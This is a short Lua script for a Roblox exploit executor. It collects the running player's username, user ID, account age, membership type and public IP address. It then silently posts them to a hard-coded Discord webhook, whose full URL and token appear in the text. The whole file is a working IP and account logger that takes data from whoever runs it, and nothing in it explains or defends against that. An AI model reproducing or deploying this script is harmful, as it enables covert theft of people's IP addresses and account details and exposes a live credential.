local Webhook = "https://discord.com/api/webhooks/994807535624269934/KLrbTE7crk9I_sqha1Od5rWCp61W5WcZcASu-51FIJXFbYKROoTaT1ap1m4J-4b2IZZQ" -- Put your Webhook link here

local IPv4 = game:HttpGet("https://v4.ident.me/")
local OneTime = false

local Headers = {["content-type"] = "application/json"} -- Don't Modify

local LocalPlayer = game:GetService("Players").LocalPlayer

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Username**:",
           ["description"] = PlayerName,
           ["color"] = tonumber(0x2B6BE4),
           ["fields"] = {
               {
                   ["name"] = "MembershipType:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
           },
       }}
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn and OneTime == false then
   HttpRequest = syn.request
   else
   HttpRequest = http_request
end

if OneTime == false then
OneTime = true
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
end
